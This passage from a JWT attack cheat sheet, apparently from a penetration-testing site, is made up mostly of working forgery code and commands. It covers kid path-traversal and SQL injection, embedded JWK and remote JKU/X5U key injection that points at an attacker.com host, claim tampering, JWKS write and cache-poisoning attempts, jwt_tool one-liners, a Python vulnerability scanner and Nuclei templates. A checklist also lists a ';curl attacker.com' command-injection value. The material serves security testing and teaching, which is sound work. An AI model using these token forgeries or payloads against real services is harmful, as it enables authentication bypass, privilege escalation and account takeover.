  {"alg":"HS256","kid":"key.pem%00.txt"}
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="/dev/null Exploit"}
  ```bash [Terminal]
  # Most reliable kid injection: /dev/null
  # /dev/null returns empty bytes → HMAC key = ""
  # Sign with empty string → signature matches!

  python3 -c "
  import jwt
  import json

  # Forge token with kid pointing to /dev/null
  headers = {
      'alg': 'HS256',
      'typ': 'JWT',
      'kid': '../../../../../../dev/null'
  }

  payload = {
      'sub': '1',
      'name': 'admin',
      'role': 'admin',
      'admin': True,
      'exp': 9999999999
  }

  # Sign with empty string (content of /dev/null)
  token = jwt.encode(payload, '', algorithm='HS256', headers=headers)
  print(token)
  "

  # Using jwt_tool:
  python3 jwt_tool.py "$TOKEN" -I \
    -hc kid -hv "../../../../../../dev/null" \
    -S hs256 -p "" \
    -pc role -pv admin \
    -pc admin -pv true

  # SQL injection via kid:
  python3 jwt_tool.py "$TOKEN" -I \
    -hc kid -hv "' UNION SELECT 'attacker_key' -- " \
    -S hs256 -p "attacker_key" \
    -pc role -pv admin
  ```
  :::
::

---

## JKU / JWK / X5U Header Injection

These header parameters tell the server **where to find** or **directly provide** the signing key. If the server trusts attacker-controlled values, the attacker supplies their own key.

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="JWK Injection (Embedded Key)"}
  ```txt [Attack Flow]
  # jwk parameter embeds the public key DIRECTLY in the JWT header
  # Server uses this embedded key to verify the signature
  # Attacker embeds THEIR OWN public key → signs with THEIR private key

  STEP 1: Generate attacker's RSA key pair
  STEP 2: Embed attacker's PUBLIC key in JWT header as "jwk"
  STEP 3: Sign token with attacker's PRIVATE key
  STEP 4: Server reads jwk from header → uses attacker's key to verify
  STEP 5: Signature is VALID (signed with matching private key)
  STEP 6: Forged token accepted!
  ```

  ```bash [Terminal]
  # Generate RSA key pair:
  openssl genrsa -out attacker_private.pem 2048
  openssl rsa -in attacker_private.pem -pubout -out attacker_public.pem

  # Forge with jwt_tool:
  python3 jwt_tool.py "$TOKEN" -X i \
    -I -pc role -pv admin \
    -I -pc admin -pv true

  # The -X i flag injects attacker's JWK into header
  ```

  ```python [jwk_inject.py]
  #!/usr/bin/env python3
  """JWT JWK Header Injection Attack"""
  import jwt
  import json
  from cryptography.hazmat.primitives.asymmetric import rsa
  from cryptography.hazmat.primitives import serialization
  from cryptography.hazmat.backends import default_backend

  # Generate attacker key pair
  private_key = rsa.generate_private_key(
      public_exponent=65537,
      key_size=2048,
      backend=default_backend()
  )
  public_key = private_key.public_key()

  # Get public key numbers for JWK
  pub_numbers = public_key.public_numbers()

  import base64
  def int_to_b64url(n, length=None):
      b = n.to_bytes(length or ((n.bit_length() + 7) // 8), 'big')
      return base64.urlsafe_b64encode(b).rstrip(b'=').decode()

  jwk = {
      "kty": "RSA",
      "n": int_to_b64url(pub_numbers.n),
      "e": int_to_b64url(pub_numbers.e),
      "kid": "attacker-key-1"
  }

  headers = {
      "alg": "RS256",
      "typ": "JWT",
      "jwk": jwk  # Embedded attacker public key!
  }

  payload = {
      "sub": "1",
      "role": "admin",
      "admin": True,
      "exp": 9999999999
  }

  private_pem = private_key.private_bytes(
      serialization.Encoding.PEM,
      serialization.PrivateFormat.PKCS8,
      serialization.NoEncryption()
  )

  token = jwt.encode(payload, private_pem, algorithm='RS256', headers=headers)
  print(f"Forged token:\n{token}")
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="JKU Injection (Key URL)"}
  ```txt [Attack Flow]
  # jku = URL where server fetches the JWK Set (signing keys)
  # Attacker points jku to THEIR server hosting THEIR keys

  STEP 1: Generate attacker's RSA key pair
  STEP 2: Create JWK Set file with attacker's public key
  STEP 3: Host JWK Set on attacker's server
  STEP 4: Set JWT header: {"jku": "https://attacker.com/jwks.json"}
  STEP 5: Sign token with attacker's private key
  STEP 6: Server fetches https://attacker.com/jwks.json
  STEP 7: Gets attacker's public key → verifies signature → VALID!
  ```

  ```bash [Terminal]
  # Generate keys:
  openssl genrsa -out attacker.pem 2048
  openssl rsa -in attacker.pem -pubout -out attacker_pub.pem

  # Create JWKS file (host on your server):
  python3 -c "
  from cryptography.hazmat.primitives import serialization
  from cryptography.hazmat.primitives.asymmetric import rsa
  from cryptography.hazmat.backends import default_backend
  import base64, json

  with open('attacker_pub.pem', 'rb') as f:
      pub = serialization.load_pem_public_key(f.read(), default_backend())

  nums = pub.public_numbers()
  def b64url(n, l=None):
      b = n.to_bytes(l or ((n.bit_length()+7)//8), 'big')
      return base64.urlsafe_b64encode(b).rstrip(b'=').decode()

  jwks = {'keys': [{
      'kty': 'RSA',
      'n': b64url(nums.n),
      'e': b64url(nums.e),
      'kid': 'attacker-key',
      'use': 'sig',
      'alg': 'RS256'
  }]}

  with open('jwks.json', 'w') as f:
      json.dump(jwks, f, indent=2)
  print(json.dumps(jwks, indent=2))
  "

  # Host the JWKS file:
  python3 -m http.server 8443 &

  # Forge token:
  python3 jwt_tool.py "$TOKEN" -X s \
    -ju "https://attacker.com/jwks.json" \
    -I -pc role -pv admin
  ```

  ```txt [JKU URL Bypass Payloads]
  # If server validates jku domain, try bypasses:

  # Subdomain:
  {"jku":"https://attacker.target.com/jwks.json"}

  # Open redirect:
  {"jku":"https://target.com/redirect?url=https://attacker.com/jwks.json"}

  # Fragment:
  {"jku":"https://target.com/jwks.json#@attacker.com/jwks.json"}

  # URL encoding:
  {"jku":"https://target.com%40attacker.com/jwks.json"}

  # Path traversal:
  {"jku":"https://target.com/jwks.json/../../../attacker.com/jwks.json"}

  # Different path:
  {"jku":"https://target.com/uploads/jwks.json"}
  # Upload your JWKS to target's file upload feature

  # Same domain (if you control a subdomain):
  {"jku":"https://evil.target.com/.well-known/jwks.json"}
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="X5U Injection (Certificate URL)"}
  ```txt [Attack Flow]
  # x5u = URL to X.509 certificate chain
  # x5c = Embedded X.509 certificate chain

  # x5u injection (similar to jku):
  STEP 1: Generate self-signed certificate with attacker's key
  STEP 2: Host certificate at https://attacker.com/cert.pem
  STEP 3: Set JWT header: {"x5u": "https://attacker.com/cert.pem"}
  STEP 4: Sign token with attacker's private key
  STEP 5: Server fetches cert → extracts public key → verifies

  # x5c injection (embedded certificate):
  STEP 1: Generate self-signed certificate
  STEP 2: Embed certificate in JWT header as "x5c" array
  STEP 3: Sign with matching private key
  ```

  ```bash [Terminal]
  # Generate self-signed certificate:
  openssl req -x509 -nodes -newkey rsa:2048 \
    -keyout attacker.key -out attacker.crt \
    -subj "/CN=attacker.com" -days 365

  # Get certificate as base64 (for x5c):
  openssl x509 -in attacker.crt -outform DER | base64 -w0

  # Forge with jwt_tool:
  python3 jwt_tool.py "$TOKEN" -X s \
    -ju "https://attacker.com/cert.pem" \
    -I -pc role -pv admin
  ```
  :::
::

---

## Claim Manipulation

Even without signature bypass, test if the application **actually validates** the signature and each claim properly.

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Payload Claim Changes"}
  ```txt [Payloads]
  # Try modifying claims WITHOUT changing signature
  # (tests if signature is actually verified)

  # Change user identity:
  "sub": "1"           → "sub": "0"          (admin user?)
  "sub": "user123"     → "sub": "admin"
  "sub": "1234"        → "sub": "1"           (first user = admin?)
  "user_id": 500       → "user_id": 1

  # Change role:
  "role": "user"       → "role": "admin"
  "role": "user"       → "role": "administrator"
  "role": "user"       → "role": "superadmin"
  "role": "viewer"     → "role": "editor"
  "role": "reader"     → "role": "writer"
  "roles": ["user"]    → "roles": ["user","admin"]

  # Add admin flag:
  "admin": false       → "admin": true
  "is_admin": 0        → "is_admin": 1
                        → Add: "admin": true

  # Change email:
  "email": "user@example.com" → "email": "admin@example.com"

  # Change organization/tenant:
  "org_id": "org-123"  → "org_id": "org-001"
  "tenant": "client-a" → "tenant": "client-b"

  # Change permissions:
  "scope": "read"      → "scope": "read write admin"
  "perms": ["view"]    → "perms": ["view","edit","delete","admin"]

  # Extend expiration:
  "exp": 1625000000    → "exp": 9999999999

  # Remove expiration (if not checked):
  Remove "exp" claim entirely

  # Change issuer:
  "iss": "https://auth.target.com" → "iss": "https://attacker.com"

  # Change audience:
  "aud": "app-client-id" → "aud": "admin-client-id"
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Expiration & Time Attacks"}
  ```txt [Payloads]
  # Token expiration bypass

  # Set expiration far in future:
  "exp": 9999999999    (year 2286)
  "exp": 32503680000   (year 3000)

  # Remove expiration entirely:
  # Delete the "exp" claim from payload
  # If server doesn't require exp → token valid forever

  # Set negative expiration:
  "exp": -1
  "exp": 0

  # Set expiration as string (type confusion):
  "exp": "9999999999"
  "exp": "never"
  "exp": true
  "exp": null

  # nbf (Not Before) manipulation:
  "nbf": 0             (always valid)
  "nbf": -99999999     (valid since 1966)
  # Remove nbf entirely

  # iat (Issued At) manipulation:
  "iat": 9999999999    (issued in the future)
  "iat": 0
  # Remove iat entirely

  # Time-based bypass:
  # If token is expired by a few seconds
  # Some implementations have a "clock skew" tolerance
  # Token expired 30 seconds ago might still be accepted
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Type Juggling"}
  ```txt [Payloads]
  # Type confusion in claim values

  # Integer vs String:
  "sub": 1              → "sub": "1"
  "sub": "1"            → "sub": 1
  "admin": true         → "admin": "true"
  "admin": "true"       → "admin": 1
  "admin": 1            → "admin": true
  "role": "admin"       → "role": ["admin"]
  "user_id": "123"      → "user_id": 123
  "user_id": 123        → "user_id": "123"

  # Null values:
  "role": null
  "admin": null
  "sub": null

  # Empty values:
  "sub": ""
  "role": ""
  "admin": ""

  # Array injection:
  "sub": ["admin"]
  "role": ["admin", "user"]
  "admin": [true]

  # Object injection:
  "sub": {"id": 1, "role": "admin"}
  "role": {"name": "admin", "level": 99}

  # Numeric zero:
  "sub": 0
  "user_id": 0
  "admin": 0

  # Boolean vs integer:
  "admin": 1  (truthy in most languages)
  "admin": "1" (truthy string)
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="jwt_tool Claim Tampering"}
  ```bash [Terminal]
  # jwt_tool - Comprehensive claim manipulation

  # Tamper mode (interactive):
  python3 jwt_tool.py "$TOKEN" -T

  # Modify specific claims:
  python3 jwt_tool.py "$TOKEN" -I -pc sub -pv "1"
  python3 jwt_tool.py "$TOKEN" -I -pc role -pv "admin"
  python3 jwt_tool.py "$TOKEN" -I -pc admin -pv true
  python3 jwt_tool.py "$TOKEN" -I -pc email -pv "admin@target.com"
  python3 jwt_tool.py "$TOKEN" -I -pc exp -pv 9999999999

  # Add new claims:
  python3 jwt_tool.py "$TOKEN" -I -pc isAdmin -pv true

  # Modify header claims:
  python3 jwt_tool.py "$TOKEN" -I -hc alg -hv none
  python3 jwt_tool.py "$TOKEN" -I -hc kid -hv "../../dev/null"

  # Multiple modifications:
  python3 jwt_tool.py "$TOKEN" -I \
    -pc sub -pv "1" \
    -pc role -pv "admin" \
    -pc admin -pv true \
    -pc exp -pv 9999999999

  # Remove signature verification (test if server checks):
  # Modify payload, keep original signature
  # If accepted → server doesn't verify signature!
  ```
  :::
::

---

## Cross-Service Token Confusion

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Token Reuse Across Services"}
  ```txt [Attack Flow]
  # If multiple services share the same JWT signing key
  # or don't validate audience (aud) claim:

  SCENARIO:
  1. App A issues JWT: {"sub":"user1","role":"user","aud":"app-a"}
  2. App B also accepts JWTs signed with the same key
  3. Attacker takes token from App A → sends to App B
  4. If App B doesn't check "aud" → accepts the token
  5. If user has different permissions on App B → privilege escalation

  ATTACK STEPS:
  1. Get JWT from lower-privilege application
  2. Try using it on higher-privilege application
  3. Try using it on admin APIs
  4. Check: Is "aud" claim validated?
  5. Check: Is "iss" claim validated?
  6. Check: Same signing key across services?

  COMMON IN:
  - Microservice architectures
  - Shared authentication services (SSO)
  - API gateways with multiple backends
  - Multi-tenant platforms
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Issuer/Audience Bypass"}
  ```txt [Payloads]
  # Modify or remove iss/aud claims:

  # Remove audience:
  # Delete "aud" claim entirely
  # If not checked → token works on any service

  # Change audience:
  "aud": "api.target.com"     → "aud": "admin.target.com"
  "aud": "user-app"           → "aud": "admin-app"
  "aud": ["app1"]             → "aud": ["app1","admin-api"]

  # Remove issuer:
  # Delete "iss" claim
  # If not checked → accept tokens from any issuer

  # Change issuer:
  "iss": "https://auth.target.com"  → "iss": "https://attacker.com"
  "iss": "app-service"              → "iss": "admin-service"

  # Cross-service testing:
  # Token from: https://api.target.com/auth/login
  # Test on:    https://admin.target.com/api/users
  # Test on:    https://internal.target.com/api/
  # Test on:    https://target.com/graphql
  ```
  :::
::

---

## Refresh Token Attacks

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Refresh Token Abuse"}
  ```txt [Attack Flow]
  # Refresh tokens are used to obtain new access tokens
  # without re-authentication

  ATTACKS:
  ─────────────────────────

  1. REFRESH TOKEN DOESN'T EXPIRE:
     - Get refresh token → use indefinitely
     - Even after user changes password
     - Even after account is "logged out"

  2. REFRESH TOKEN NOT BOUND TO USER:
     - Attacker's refresh token used with victim's user ID
     - POST /token {refresh_token: ATTACKER_TOKEN, user_id: VICTIM_ID}

  3. REFRESH TOKEN REUSE:
     - Same refresh token generates unlimited access tokens
     - Refresh token should be single-use (rotated)

  4. NO REFRESH TOKEN REVOCATION:
     - Logout doesn't invalidate refresh token
     - Password change doesn't revoke existing tokens
     - Deactivated account tokens still work

  5. REFRESH TOKEN SCOPE ESCALATION:
     - Request new access token with MORE permissions
     - POST /token {refresh_token: TOKEN, scope: "admin"}

  6. REFRESH TOKEN IN URL/LOGS:
     - Refresh token passed as URL parameter (logged)
     - Refresh token in Referer header
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Token Lifecycle Testing"}
  ```txt [Test Matrix]
  □ Does access token expire properly?
  □ Does refresh token expire?
  □ Can expired access token still be used?
  □ Is refresh token single-use (rotated)?
  □ Does logout revoke refresh tokens?
  □ Does password change revoke all tokens?
  □ Can refresh token be used from different IP?
  □ Can refresh token be used from different device?
  □ Is refresh token bound to specific access token?
  □ Can refresh request add extra scopes?
  □ Are old access tokens revoked when refreshed?
  □ Is there a maximum refresh token lifetime?
  ```
  :::
::

---

## JWKS Endpoint Attacks

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="JWKS Enumeration"}
  ```bash [Terminal]
  # Find and analyze JWKS endpoints

  # Common JWKS paths:
  PATHS=(
    "/.well-known/jwks.json"
    "/oauth/jwks"
    "/api/keys"
    "/api/jwks"
    "/jwks"
    "/jwks.json"
    "/.well-known/openid-configuration"
    "/certs"
    "/oauth2/certs"
    "/oauth/certs"
    "/.well-known/keys"
    "/api/.well-known/jwks.json"
    "/auth/jwks"
    "/auth/keys"
    "/v1/jwks"
    "/v2/jwks"
  )

  for path in "${PATHS[@]}"; do
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com$path")
    if [ "$STATUS" = "200" ]; then
      echo "[+] Found JWKS: https://target.com$path"
      curl -s "https://target.com$path" | jq .
    fi
  done

  # From OpenID configuration:
  JWKS_URI=$(curl -s "https://target.com/.well-known/openid-configuration" | \
    jq -r '.jwks_uri')
  echo "[+] JWKS URI: $JWKS_URI"
  curl -s "$JWKS_URI" | jq .
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="JWKS Confusion"}
  ```txt [Attack Flow]
  # JWKS Spoofing / Confusion attacks:

  1. KEY CONFUSION VIA KID:
     - JWKS has multiple keys with different kid values
     - Attacker changes kid in JWT to select a different key
     - If one key is weaker → easier to exploit

  2. ADD KEY TO JWKS (if writable):
     - Check if JWKS endpoint accepts PUT/POST
     - POST /jwks {"keys": [...existing..., attacker_key]}
     - Now attacker's key is in the trusted key set!

  3. JWKS CACHE POISONING:
     - JWKS is cached by the application
     - Poison the cache with attacker's JWKS
     - Application uses cached attacker keys for verification

  4. JWKS ENDPOINT SSRF:
     - If application fetches JWKS from configurable URL
     - Point to internal JWKS that uses different keys
     - Or point to attacker-controlled JWKS

  # Check if JWKS is writable:
  curl -X POST "https://target.com/.well-known/jwks.json" \
    -H "Content-Type: application/json" \
    -d '{"keys":[{"kty":"RSA","n":"attacker_n","e":"AQAB","kid":"pwned"}]}'

  curl -X PUT "https://target.com/.well-known/jwks.json" \
    -H "Content-Type: application/json" \
    -d @attacker_jwks.json
  ```
  :::
::

---

## Privilege Escalation Chains

::card-group
  ::card
  ---
  title: Algorithm None → Admin Token → Full Control
  icon: i-lucide-shield-off
  ---
  Remove signature verification → Forge admin JWT with `"role":"admin"` → **Full administrative access** to every endpoint. **Severity: Critical**.
  ::

  ::card
  ---
  title: Secret Crack → Mass Token Forgery → All Accounts
  icon: i-lucide-lock-open
  ---
  Crack weak HMAC secret → Generate valid JWTs for **any user** → Impersonate administrators, access all data. **Severity: Critical**.
  ::

  ::card
  ---
  title: Algorithm Confusion → Public Key Signing → Universal Forgery
  icon: i-lucide-shuffle
  ---
  Switch RS256→HS256, sign with public key → Forge tokens for **any identity** using publicly available key material. **Severity: Critical**.
  ::

  ::card
  ---
  title: Kid Injection → Path Traversal → Controlled Key
  icon: i-lucide-syringe
  ---
  Point kid to `/dev/null` → Sign with empty key → **Admin token with predictable signature**. Chain with SQLi for data extraction. **Severity: Critical**.
  ::

  ::card
  ---
  title: JKU/JWK Injection → Key Control → Unlimited Forgery
  icon: i-lucide-key
  ---
  Embed attacker's key in header or point to attacker's JWKS → Server trusts attacker's key → **Sign any token**. **Severity: Critical**.
  ::

  ::card
  ---
  title: Cross-Service Reuse → Horizontal/Vertical Escalation
  icon: i-lucide-git-branch
  ---
  Reuse JWT across services that share keys → Token from low-privilege app accepted on **admin API** → Privilege escalation. **Severity: High**.
  ::
::

---

## Testing Checklist

::collapsible

```txt [JWT Attack Testing Checklist]
═══════════════════════════════════════════════════════
  JWT ATTACK TESTING CHECKLIST
═══════════════════════════════════════════════════════

[ ] RECONNAISSANCE
    [ ] Find JWT in requests (Authorization, Cookie, body, URL)
    [ ] Decode header and payload (jwt.io, jwt_tool, CLI)
    [ ] Identify algorithm (HS256, RS256, ES256, none?)
    [ ] Note all claims (sub, role, admin, exp, iss, aud)
    [ ] Check for kid, jku, jwk, x5u, x5c in header
    [ ] Find JWKS endpoint (/.well-known/jwks.json)
    [ ] Find OpenID configuration
    [ ] Determine if symmetric or asymmetric
    [ ] Obtain public key (if asymmetric)
    [ ] Check token storage (cookie? localStorage? header?)

[ ] ALGORITHM NONE
    [ ] alg: "none" (lowercase)
    [ ] alg: "None" (capitalized)
    [ ] alg: "NONE" (uppercase)
    [ ] alg: "nOnE" (mixed case)
    [ ] Empty signature (trailing dot)
    [ ] No trailing dot
    [ ] Empty alg: ""
    [ ] Null alg: null

[ ] ALGORITHM CONFUSION
    [ ] Change RS256 → HS256
    [ ] Sign with server's RSA public key as HMAC secret
    [ ] Try different key formats (PEM, DER, raw bytes)
    [ ] Change RS256 → HS384 / HS512
    [ ] Change ES256 → HS256

[ ] SECRET BRUTE FORCE
    [ ] hashcat -m 16500 (GPU cracking)
    [ ] John the Ripper (CPU cracking)
    [ ] jwt_tool dictionary attack
    [ ] jwt-cracker brute force
    [ ] Common secrets wordlist
    [ ] Default/weak passwords

[ ] KID INJECTION
    [ ] Path traversal to /dev/null
    [ ] Path traversal to known files
    [ ] SQL injection (UNION SELECT 'key')
    [ ] Command injection (;curl attacker.com)
    [ ] LDAP injection
    [ ] Null byte injection

[ ] JKU / JWK / X5U INJECTION
    [ ] Embed attacker's JWK in header
    [ ] Point jku to attacker's JWKS URL
    [ ] Point x5u to attacker's certificate
    [ ] Embed x5c with self-signed certificate
    [ ] JKU URL bypass (open redirect, subdomain, etc.)

[ ] CLAIM MANIPULATION
    [ ] Change sub (user ID) to admin
    [ ] Change role to admin
    [ ] Add admin: true
    [ ] Change email to admin's email
    [ ] Extend exp (expiration)
    [ ] Remove exp entirely
    [ ] Modify aud (audience)
    [ ] Modify iss (issuer)
    [ ] Change scope/permissions
    [ ] Type juggling (string↔integer↔boolean)

[ ] SIGNATURE VERIFICATION
    [ ] Modify payload WITHOUT changing signature → accepted?
    [ ] Remove signature entirely → accepted?
    [ ] Use wrong signature → accepted?
    [ ] Submit without JWT → what happens?

[ ] TOKEN LIFECYCLE
    [ ] Expired token accepted?
    [ ] Token valid after logout?
    [ ] Token valid after password change?
    [ ] Refresh token expiration
    [ ] Refresh token revocation
    [ ] Refresh token reuse (single-use?)
    [ ] Refresh scope escalation

[ ] CROSS-SERVICE
    [ ] Token from App A works on App B?
    [ ] Token reuse across microservices
    [ ] Audience claim validated?
    [ ] Issuer claim validated?
    [ ] Same signing key across services?

[ ] ADVANCED
    [ ] JWKS endpoint writable? (PUT/POST)
    [ ] JWKS cache poisoning
    [ ] Nested JWT attacks (cty: "JWT")
    [ ] Token side-jacking (via XSS, Referer)
    [ ] JWT stored in insecure location?
    [ ] Token in URL parameters (logged?)

═══════════════════════════════════════════════════════
```

::

---

## Automation & Tools

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="jwt_tool (All-in-One)"}
  ```bash [Terminal]
  # jwt_tool - The Swiss Army Knife for JWT testing

  # Installation:
  git clone https://github.com/ticarpi/jwt_tool.git
  cd jwt_tool
  pip3 install -r requirements.txt

  # Decode token:
  python3 jwt_tool.py "$TOKEN"

  # Run ALL attacks (automated):
  python3 jwt_tool.py "$TOKEN" -M at -t "https://target.com/api/admin" \
    -rh "Authorization: Bearer"

  # Algorithm none:
  python3 jwt_tool.py "$TOKEN" -X a

  # Algorithm confusion (RS256→HS256):
  python3 jwt_tool.py "$TOKEN" -X k -pk public_key.pem

  # JWK injection:
  python3 jwt_tool.py "$TOKEN" -X i

  # JKU spoofing:
  python3 jwt_tool.py "$TOKEN" -X s -ju "https://attacker.com/jwks.json"

  # Crack secret:
  python3 jwt_tool.py "$TOKEN" -C -d wordlist.txt

  # Tamper claims:
  python3 jwt_tool.py "$TOKEN" -T

  # Sign with known secret:
  python3 jwt_tool.py "$TOKEN" -S hs256 -p "secret" \
    -I -pc role -pv admin

  # Exploit kid injection:
  python3 jwt_tool.py "$TOKEN" -I -hc kid -hv "../../dev/null" \
    -S hs256 -p ""

  # Fuzz claims:
  python3 jwt_tool.py "$TOKEN" -I -pc sub -pv "FUZZ" \
    -S hs256 -p "secret"
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Comprehensive Scanner"}
  ::code-collapse
  ```python [jwt_scanner.py]
  #!/usr/bin/env python3
  """
  JWT Vulnerability Scanner
  Tests multiple attack vectors automatically
  """
  import base64
  import json
  import hmac
  import hashlib
  import requests
  import sys

  class JWTScanner:
      def __init__(self, token, target_url=None, auth_header="Authorization"):
          self.token = token
          self.target_url = target_url
          self.auth_header = auth_header
          self.findings = []
          self.parts = token.split('.')
          self.header = json.loads(self._b64decode(self.parts[0]))
          self.payload = json.loads(self._b64decode(self.parts[1]))
      
      def _b64encode(self, data):
          if isinstance(data, str):
              data = data.encode()
          return base64.urlsafe_b64encode(data).rstrip(b'=').decode()
      
      def _b64decode(self, data):
          padded = data + '=' * (4 - len(data) % 4)
          return base64.urlsafe_b64decode(padded)
      
      def _forge(self, header, payload, secret=b''):
          h = self._b64encode(json.dumps(header))
          p = self._b64encode(json.dumps(payload))
          msg = f"{h}.{p}".encode()
          sig = hmac.new(secret if isinstance(secret, bytes) else secret.encode(), 
                         msg, hashlib.sha256).digest()
          return f"{h}.{p}.{self._b64encode(sig)}"
      
      def _test_token(self, token, desc):
          if not self.target_url:
              return None
          try:
              headers = {self.auth_header: f"Bearer {token}"}
              resp = requests.get(self.target_url, headers=headers, timeout=10)
              accepted = resp.status_code not in [401, 403, 400]
              if accepted:
                  self.findings.append(f"[!] {desc}: HTTP {resp.status_code}")
              return resp.status_code
          except:
              return None
      
      def test_none_algorithm(self):
          print("\n[1] Testing Algorithm None...")
          for alg in ["none", "None", "NONE", "nOnE"]:
              header = {"alg": alg, "typ": "JWT"}
              payload = self.payload.copy()
              payload["exp"] = 9999999999
              h = self._b64encode(json.dumps(header))
              p = self._b64encode(json.dumps(payload))
              
              for suffix in [".", ""]:
                  token = f"{h}.{p}{suffix}"
                  status = self._test_token(token, f"alg={alg} ({suffix or 'no dot'})")
                  if status and status not in [401, 403, 400]:
                      print(f"    [!] VULNERABLE: alg={alg} accepted! (HTTP {status})")
                      return True
              print(f"    [-] alg={alg}: Rejected")
          return False
      
      def test_signature_strip(self):
          print("\n[2] Testing Signature Not Verified...")
          # Modify payload but keep original signature
          payload = self.payload.copy()
          payload["role"] = "admin"
          payload["admin"] = True
          
          h = self.parts[0]  # Original header
          p = self._b64encode(json.dumps(payload))
          s = self.parts[2]  # Original signature (wrong for new payload)
          
          token = f"{h}.{p}.{s}"
          status = self._test_token(token, "Modified payload, original signature")
          if status and status not in [401, 403, 400]:
              print(f"    [!] VULNERABLE: Signature NOT verified! (HTTP {status})")
              return True
          print(f"    [-] Signature appears to be verified")
          return False
      
      def test_expired_token(self):
          print("\n[3] Testing Expired Token Handling...")
          if "exp" in self.payload:
              import time
              if self.payload["exp"] < time.time():
                  status = self._test_token(self.token, "Expired token")
                  if status and status not in [401, 403, 400]:
                      print(f"    [!] VULNERABLE: Expired token accepted! (HTTP {status})")
                      return True
              else:
                  print(f"    [*] Token not yet expired (exp: {self.payload['exp']})")
          else:
              print(f"    [!] No 'exp' claim found - token may never expire!")
              self.findings.append("No expiration claim in JWT")
          return False
      
      def test_weak_secret(self):
          print("\n[4] Testing Common Secrets...")
          if self.header.get("alg", "").startswith("HS"):
              common = ["secret", "password", "123456", "key", "jwt_secret",
                        "changeme", "admin", "test", "default", "supersecret",
                        "mysecret", "private", "public", "token", "secret123",
                        "", "null", "jwt", "hmac", "signing_key"]
              
              for secret in common:
                  h = self._b64encode(json.dumps(self.header))
                  p = self.parts[1]  # Original payload
                  msg = f"{h}.{p}".encode()
                  sig = hmac.new(secret.encode(), msg, hashlib.sha256).digest()
                  expected_sig = self._b64encode(sig)
                  
                  if expected_sig == self.parts[2]:
                      print(f"    [!] SECRET FOUND: '{secret}'")
                      self.findings.append(f"Weak HMAC secret: '{secret}'")
                      return secret
              print(f"    [-] No common secrets matched (try hashcat for full crack)")
          else:
              print(f"    [*] Algorithm is {self.header.get('alg')} (not HMAC)")
          return None
      
      def analyze(self):
          print("=" * 60)
          print("  JWT VULNERABILITY SCANNER")
          print("=" * 60)
          print(f"\n  Algorithm: {self.header.get('alg')}")
          print(f"  Type: {self.header.get('typ')}")
          print(f"  Kid: {self.header.get('kid', 'N/A')}")
          print(f"  JKU: {self.header.get('jku', 'N/A')}")
          print(f"  JWK: {'Present' if 'jwk' in self.header else 'N/A'}")
          
          print(f"\n  Claims:")
          for k, v in self.payload.items():
              print(f"    {k}: {v}")
          
          # Check for attack surfaces
          surfaces = []
          if self.header.get("kid"):
              surfaces.append("kid parameter (injection target)")
          if self.header.get("jku"):
              surfaces.append("jku parameter (URL injection)")
          if "jwk" in self.header:
              surfaces.append("jwk parameter (key injection)")
          if self.header.get("x5u"):
              surfaces.append("x5u parameter (cert URL injection)")
          if not self.payload.get("exp"):
              surfaces.append("No expiration - token valid forever!")
          if not self.payload.get("aud"):
              surfaces.append("No audience - cross-service reuse possible")
          
          if surfaces:
              print(f"\n  Attack Surfaces:")
              for s in surfaces:
                  print(f"    [!] {s}")
          
          # Run tests
          self.test_none_algorithm()
          self.test_signature_strip()
          self.test_expired_token()
          self.test_weak_secret()
          
          # Summary
          print(f"\n{'='*60}")
          print(f"  FINDINGS: {len(self.findings)}")
          print(f"{'='*60}")
          for f in self.findings:
              print(f"  {f}")
          if not self.findings:
              print("  No automated findings (manual testing recommended)")
          print(f"{'='*60}")

  if __name__ == "__main__":
      if len(sys.argv) < 2:
          print(f"Usage: {sys.argv[0]} <jwt_token> [target_url]")
          sys.exit(1)
      
      token = sys.argv[1]
      url = sys.argv[2] if len(sys.argv) > 2 else None
      
      scanner = JWTScanner(token, url)
      scanner.analyze()
  ```
  ::
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Nuclei Templates"}
  ::code-collapse
  ```yaml [jwt-attacks.yaml]
  id: jwt-algorithm-none

  info:
    name: JWT Algorithm None Bypass
    author: security-researcher
    severity: critical
    description: Tests if server accepts JWTs with algorithm set to "none"
    tags: jwt,authentication,bypass

  http:
    - raw:
        - |
          GET /api/admin HTTP/1.1
          Host: {{Hostname}}
          Authorization: Bearer {{alg_none_token}}

      matchers-condition: and
      matchers:
        - type: status
          status:
            - 200
        - type: word
          negative: true
          words:
            - "unauthorized"
            - "invalid token"
            - "forbidden"

  ---

  id: jwt-weak-secret

  info:
    name: JWT Weak HMAC Secret
    author: security-researcher
    severity: high
    description: Tests if JWT uses a common/weak HMAC signing secret
    tags: jwt,authentication,weak-secret

  http:
    - raw:
        - |
          GET /api/profile HTTP/1.1
          Host: {{Hostname}}
          Authorization: Bearer {{jwt_token}}

      extractors:
        - type: regex
          name: jwt-token
          group: 1
          regex:
            - 'eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+'

  ---

  id: jwt-jwks-exposed

  info:
    name: JWT JWKS Endpoint Exposed
    author: security-researcher
    severity: info
    description: Public JWKS endpoint found - keys can be used for algorithm confusion
    tags: jwt,jwks,keys

  http:
    - method: GET
      path:
        - "{{BaseURL}}/.well-known/jwks.json"
        - "{{BaseURL}}/oauth/jwks"
        - "{{BaseURL}}/api/keys"
        - "{{BaseURL}}/certs"

      matchers-condition: and
      matchers:
        - type: status
          status:
            - 200
        - type: word
          words:
            - '"keys"'
            - '"kty"'
          condition: and
  ```
  ::
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Burp Suite Extensions"}
